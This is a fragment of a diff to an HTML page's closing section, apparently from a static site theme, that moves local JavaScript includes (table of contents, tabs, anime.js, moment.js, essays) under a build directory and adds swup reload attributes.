+<script src="/js/build/libs/anime.min.js"></script>
 
 
 
-<div class="post-scripts" data-swup-reload-script>
-    
-        
-<script src="/js/tools/tocToggle.js" type="module"></script>
 
-<script src="/js/layouts/toc.js" type="module"></script>
-
-<script src="/js/plugins/tabs.js" type="module"></script>
 
     
-</div>
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
 
 
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
 </body>
+
 </html>
